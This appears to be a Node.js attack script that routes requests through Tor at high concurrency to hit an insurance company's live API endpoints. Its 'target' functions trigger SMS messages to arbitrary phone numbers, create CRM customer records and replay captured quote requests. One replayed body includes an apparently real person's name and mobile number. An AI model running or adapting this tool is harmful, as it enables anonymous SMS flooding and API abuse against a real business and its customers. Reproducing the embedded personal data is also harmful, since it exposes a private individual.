const axios = require("axios");
const { SocksProxyAgent } = require("socks-proxy-agent");
const pLimit = require("p-limit");

const TOR_SOCKS_URL = process.env.TOR_SOCKS_URL || "socks5h://127.0.0.1:9050";
const TOR_ENABLED = process.env.TOR_ENABLED === "1";
const TOR_CONCURRENCY = Number(process.env.TOR_CONCURRENCY) || 8;

const torAgent = TOR_ENABLED ? new SocksProxyAgent(TOR_SOCKS_URL, { keepAlive: true }) : null;
const torLimit = pLimit(TOR_CONCURRENCY);

function torRequest(config) {
    const base = { ...config, proxy: false };
    if (torAgent) base.httpsAgent = torAgent;
    return torLimit(() => axios(base));
}

const body4 = {
    payload: "EqmOGBbKW4aRltA8G6PYmw==:alfrcyVmGLRVOTNYXTewp23n1GhhjjuFiXQ77l/pI0wFfZxzTUA29dDobwc2TGAx1M4uwdbNN0dpu1Luu/7mmgyZKBKTSuRN2tkIVTAUt3T9KzwPBnCjyYsOq91gKzhgiQs4s3VwI0KnOPGBh1Qcm4IEJ9UOD6AcNiOMXNBb+571s99R7vhMkHoEjlE3WRZ0THVtsgpiq1BmdUWdQ2taoFhC7xDb84AAzGuiWfqWW2H4ofXf4Fhux+X0irZxPbGtzF3DPtwMRDf7g5Oae12AGh7x7tHYahcTwEUf3Y8DezKFjK2UCyFeoJcOyBzPSFtQCZd7qrbyUpLJgioAu12lb9wkljpf2QA2aCP0efXEudK0wvSHZ+U3vc1JWxB13USYaQGOPhO+k4ZvWWMbP/tdbddDmy33dDDELef59c9COacPuUc/GMiccEmyGhpZ1Shd9UuHRFXdtaaQeFjNGgoXhV49sdwCefOMyYGmheJfK/YhnWHLA5SmoLnfCTerGSDzrRb1JWSTQO4GEHRwyNxFZg=="
}

const body5 = {
    "enquiryId": "LMV_QQ_PVT_CAR_PACKAGE_01",
    "user": {
        "login": false,
        "userType": "",
        "empid": ""
    },
    "response": {
        "org_id": "",
        "posp_id": ""
    },
    "CustomerResponse": {
        "customer_id": ""
    },
    "EmployeePermission": {
        "user_Id": ""
    },
    "CustomerLoginResponse": "",
    "Agent_ID": "",
    "profile": {
        "org": {
            "orgID": "100",
            "orgName": "LMV FINANCE SERVICE"
        },
        "agent": {
            "agentId": "1000",
            "mobileNumber": "",
            "otpStatus": "",
            "loginStatus": ""
        },
        "customer": {
            "customerId": "",
            "policyYear": "",
            "policyType": "Pvt Car",
            "policyStatus": "",
            "kycLink": "",
            "paymentLink": "",
            "pdfLink": "",
            "policyNumber": "",
            "proposalNumber": "",
            "applicationId": "",
            "phone": "",
            "otpStatus": "",
            "rcNumber": "",
            "correlationId": ""
        },
        "navigation": "",
        "applicationId": "",
        "number": "",
        "agentId": "1000"
    },
    "rc": {
        "number": "",
        "registrationDate": "",
        "name": "RUMAN DANESH",
        "rtoCode": "BR38",
        "status": "ACTIVE",
        "email": "",
        "phone": "7989259115",
        "dob": "",
        "gender": "",
        "martialStatus": ""
    },
    "vehicle": {
        "vehicleType": "Car",
        "vehicleCatagory": "",
        "gvw": "",
        "bodyType": "",
        "isVehicleNew": false,
        "isVehicleWithoutNumber": true,
        "vehicleRegisteredState": "BIHAR",
        "vehicleRegisteredCity": "ARARIA",
        "vehicleMaincode": "1500911001",
        "manufactureDate": "2025-01-01",
        "category": "",
        "engineNumber": "",
        "chasisNumber": "",
        "makerModel": "CHEVROLET",
        "variant": "1.4",
        "makerDescription": "",
        "model": "AVEO",
        "fuelType": "PETROL",
        "permitType": "PUBLIC",
        "usageType": "",
        "registrationDate": "2025-09-01",
        "loanProviderName": "",
        "pucNumber": "",
        "pucExpiryDate": "",
        "vehicleIDV": {
            "idv": "",
            "defaultIdv": "",
            "minimumIdv": "",
            "maximumIdv": ""
        }
    },
    "insurance": {
        "TransactionID": "LMV0000081924794",
        "preInspectionId": "",
        "bajajTransactionId": "",
        "correlationId": "",
        "breakinPin": "",
        "ilKycRef": "",
        "ckycId": "",
        "isZeroDep": "",
        "isRTICover": "",
        "vehcileAge": "",
        "presentNcbValue": "0%",
        "policyType": "COMPREHENSIVE",
        "insuranceProductCode": "",
        "subInsuranceProductCode": "",
        "policyHolderType": "INDIVIDUAL",
        "existingComprehensivePolicy": "",
        "claimsMade": false,
        "ncbValue": "TWENTY_FIVE",
        "instrumentNumber": "",
        "providerName": "",
        "providerNames": [
            "godigit",
            "hdfc",
            "icici",
            "bajaj",
            "shriram",
            "reliance"
        ],
        "netPremium": "",
        "grossPremium": "",
        "checksum": "123456789",
        "authCode": "",
        "PGtransactionId": "",
        "MerchantId": "",
        "paymentId": "",
        "breakinId": "",
        "coverages": {
            "voluntaryDeductible": null,
            "thirdPartyLiability": {
                "isTPPD": false
            },
            "ownDamage": {
                "discount": {
                    "userSpecialDiscountPercent": 0,
                    "discounts": []
                },
                "surcharge": {
                    "loadings": []
                }
            },
            "personalAccident": {
                "selection": false,
                "insuredAmount": 0,
                "coverTerm": null
            },
            "handiCapDiscount": {
                "selection": false
            },
            "accessories": {
                "cng": {
                    "selection": false,
                    "insuredAmount": 0
                },
                "electrical": {
                    "selection": false,
                    "insuredAmount": 0
                },
                "nonElectrical": {
                    "selection": false,
                    "insuredAmount": 0
                }
            },
            "addons": {
                "partsDepreciation": {
                    "claimsCovered": null,
                    "selection": false
                },
                "roadSideAssistance": {
                    "selection": false
                },
                "engineProtection": {
                    "selection": false
                },
                "tyreProtection": {
                    "selection": false
                },
                "rimProtection": {
                    "selection": false
                },
                "returnToInvoice": {
                    "selection": false
                },
                "keyAndLockProtect": {
                    "selection": false
                },
                "lossOfPersonalBelongings": {
                    "selection": false
                },
                "consumables": {
                    "selection": false
                }
            },
            "legalLiability": {
                "paidDriverLL": {
                    "selection": false,
                    "insuredCount": null
                },
                "employeesLL": {
                    "selection": false,
                    "insuredCount": null
                },
                "unnamedPaxLL": {
                    "selection": false,
                    "insuredCount": null
                },
                "cleanersLL": {
                    "selection": false,
                    "insuredCount": null
                },
                "nonFarePaxLL": {
                    "selection": false,
                    "insuredCount": null
                },
                "workersCompensationLL": {
                    "selection": false,
                    "insuredCount": null
                }
            },
            "unnamedPA": {
                "unnamedPax": {
                    "selection": false,
                    "insuredAmount": null,
                    "insuredCount": null
                },
                "unnamedPaidDriver": {
                    "selection": false,
                    "insuredAmount": null,
                    "insuredCount": null
                },
                "unnamedHirer": {
                    "selection": false,
                    "insuredAmount": null,
                    "insuredCount": null
                },
                "unnamedPillionRider": {
                    "selection": false,
                    "insuredAmount": null,
                    "insuredCount": null
                },
                "unnamedCleaner": {
                    "selection": false,
                    "insuredAmount": null,
                    "insuredCount": null
                },
                "unnamedConductor": {
                    "selection": false,
                    "insuredAmount": null,
                    "insuredCount": null
                }
            }
        },
        "nomminee": {
            "name": "",
            "dob": "",
            "relation": ""
        },
        "kyc": {
            "doctype": "PAN_CARD",
            "docNumber": "",
            "consent": false,
            "base64String": "",
            "hdfcKycResponse": {},
            "addresses": {
                "houseNumber": "",
                "street": "",
                "state": "",
                "district": "",
                "city": "",
                "country": "IN",
                "pincode": 854102
            },
            "pehchanId": ""
        }
    },
    "previousPolicyDetails": {
        "isPreviousInsurerKnown": true,
        "policyCompany": 152,
        "policyNumber": "",
        "policyStartDate": "",
        "policyEndDate": "2025-09-17",
        "policyTPCompany": "",
        "policyTPNumber": "",
        "policyTPStartDate": "",
        "policyTPEndDate": "",
        "policyType": "1OD_3TP"
    },
    "motorQuestions": {
        "furtherAgreement": null,
        "selfInspection": false,
        "financer": null
    },
    "motorBreakIn": {
        "isBreakin": false,
        "isPreInspectionWaived": false,
        "isPreInspectionCompleted": false,
        "isDocumentUploaded": false
    },
    "documents": []
}

function requirePhone(phone_number) {
    if (typeof phone_number !== "string" || !/^\d{10,15}$/.test(phone_number)) {
        const err = new Error("phone_number is required (10–15 digits)");
        err.status = 400;
        throw err;
    }
    return phone_number;
}

async function target1() {
    try {
        const ipRes = await torRequest({
            method: "get",
            url: "https://httpbin.org/ip"
        });
        return { res1: ipRes.data.origin };
    } catch (err) {
        console.log("getting error here");
        throw err;
    }
}

async function target2({ phone_number, customer_name } = {}) {
    const phone = requirePhone(phone_number);
    const body = {
        phone,
        org_id: "100",
        agent_id: "1000",
        method: "SEND",
        type: "C",
        name: customer_name || ""
    };
    console.log(body);
    const result = await torRequest({
        method: "post",
        url: "https://75e8n7v4uj.execute-api.ap-south-1.amazonaws.com/Prod/messages/v1/sms",
        data: body
    });
    return { res2: result.data };
}

async function target3({ phone_number, customer_name } = {}) {
    const phone = requirePhone(phone_number);
    const body = {
        customer_name: customer_name || "",
        phone,
        org_id: "100",
        agent_id: "1000",
        method: "POST",
        type: "C"
    };
    const result = await torRequest({
        method: "post",
        url: "https://75e8n7v4uj.execute-api.ap-south-1.amazonaws.com/Prod/insurance/crm/v1/org/agent/customer",
        data: body
    });
    return { res3: result.data };
}

async function target4() {
    const result = await torRequest({
        method: "post",
        url: "https://c4vygufp78.execute-api.ap-south-1.amazonaws.com/Prod/insurance/v1/health/policy/quote",
        data: body4
    });
    return { res4: result.data };
}

async function target5() {
    const result = await torRequest({
        method: "post",
        url: "https://73rhs0ky9d.execute-api.ap-south-1.amazonaws.com/prod/insurance/v1/motor/policy/quote",
        data: body5
    });
    return { res5: result.data };
}


module.exports = { target1, target2, target3, target4, target5 };